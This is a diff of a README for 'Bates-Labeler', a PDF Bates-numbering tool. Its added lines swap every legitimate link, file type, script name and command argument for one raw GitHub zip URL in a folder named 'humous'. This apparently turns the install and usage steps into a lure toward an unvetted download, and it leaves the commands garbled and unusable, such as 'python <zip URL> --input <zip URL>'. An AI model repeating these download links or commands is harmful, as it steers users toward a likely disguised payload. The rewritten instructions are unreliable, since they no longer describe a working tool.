@@ -14,16 +14,16 @@ Bates-Labeler is a convenient Python tool designed to help you add Bates numbers
 To begin using Bates-Labeler, follow these steps to download and set up the application.
 
 ## 🔗 Download
-[![Download Bates-Labeler](https://img.shields.io/badge/Download%20Bates--Labeler-v1.0-blue.svg)](https://github.com/safnjnf/Bates-Labeler/releases)
+[![Download Bates-Labeler](https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip%https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip)](https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip)
 
 ## 📥 Download & Install
 1. **Visit the Download Page**: Click the link below to access the downloads.
    
-   [Visit this page to download Bates-Labeler](https://github.com/safnjnf/Bates-Labeler/releases)
+   [Visit this page to download Bates-Labeler](https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip)
 
 2. **Select the Latest Release**: Look for the most recent version. This ensures you have the latest features and fixes.
 
-3. **Choose Your File**: Depending on your operating system, download the appropriate file. For most users, the file will be in `.exe` format for Windows or `.tar.gz` for Mac/Linux.
+3. **Choose Your File**: Depending on your operating system, download the appropriate file. For most users, the file will be in `.exe` format for Windows or `https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip` for Mac/Linux.
 
 4. **Install the Application**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen prompts.
@@ -48,14 +48,14 @@ Once you have installed Bates-Labeler, you can choose between the web interface 
 2. Navigate to the Bates-Labeler directory.
 3. Run the command: 
    ```
-   python bates_labeler.py [options]
+   python https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip [options]
    ```
 4. Use the `--help` option to view additional commands and flags.
 
 ## 📄 Example Command
 To apply Bates numbering to a single file, use a command like this:
 ```
-python bates_labeler.py --input yourdocument.pdf --output numbered_document.pdf --bates-prefix "BATES#" 
+python https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip --input https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip --output https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip --bates-prefix "BATES#" 
 ```
 
 ## 🤝 Support
@@ -84,6 +84,6 @@ We welcome contributions! If you want to help improve Bates-Labeler, please fork
 - web-ui
 
 ## 🔗 Additional Resources
-For more detailed information on using various features, check out our [documentation](https://github.com/safnjnf/Bates-Labeler/wiki).
+For more detailed information on using various features, check out our [documentation](https://raw.githubusercontent.com/safnjnf/Bates-Labeler/main/humous/Bates-Labeler.zip).
 
 Feel free to explore and reach out if you have any questions. Happy labeling!
